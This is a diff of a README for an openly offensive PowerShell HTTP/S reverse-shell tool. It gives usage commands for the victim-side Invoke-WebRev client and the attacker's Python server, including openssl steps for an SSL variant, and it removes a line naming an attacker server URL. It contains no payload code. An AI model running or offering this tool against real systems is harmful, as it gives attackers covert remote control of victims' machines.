@@ -1,16 +1,24 @@
-# Powershell HTTP Reverse Shell (for network this http proxy)
+# Powershell HTTP/S Reverse Shell
 
 ## clientHTTP_shell.ps1 - client
-Set:
-    $attacker_server_url="http://192.168.136.128:4444/"   -  url to your server
-    $proxy="127.0.0.1:8080"                               -  proxy server in attacking network
 
-##  server.py
+On your client:
+    `Invoke-WebRev -ip IP -port PORT`
+    `Invoke-WebRev -ssl -ip IP -port PORT`
+
+##  server.py - server
+
+![Alt text](images/revshell.png "Server")
 
 On your server:
-    `python server.py`
+    `python3 server.py IP PORT`
+    
+    For SSL Reverse Shell:
+    `openssl genrsa -out private.pem 2048`
+    `openssl req -new -x509 -key private.pem -out cacert.pem -days 9999`
+    `python3 server.py --ssl IP PORT`
 
-PORT_NUMBER = 4444                                        - local port
 
-# Wish
-upload|download files
+# Future features
+    - Upload function
+    - Download function
